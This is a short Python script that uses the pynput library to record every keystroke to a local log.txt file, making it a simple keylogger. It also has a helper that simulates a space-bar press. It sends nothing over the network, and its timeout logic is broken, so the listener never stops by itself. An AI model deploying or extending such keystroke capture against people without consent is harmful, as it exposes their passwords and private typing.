from pynput.keyboard import Key, Listener, Controller
from pynput import keyboard
import logging
import time


def press_key():

    keyboard = Controller()

    keyboard.press(Key.space)
    keyboard.release(Key.space)
    

def log_keys():
    

    #log_dir = 'c:\\users\Theodor\Desktop\\log.txt'

    
    log_dir = ""

    logging.basicConfig(filename=(log_dir+'log.txt'), level=logging.DEBUG,format='%(message)s')

    def on_press(key):
        logging.info(str(key))

        

    def on_release(key):

        start = time.time()

        if time.time()-start > 5:
            # Stop listener
            return False

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

    time.sleep(2)
    press_key()

    
    """if time.time() - start > interval:
        keyboard.press(Key.esc)
        keyboard.release(Key.esc)"""


log_keys()

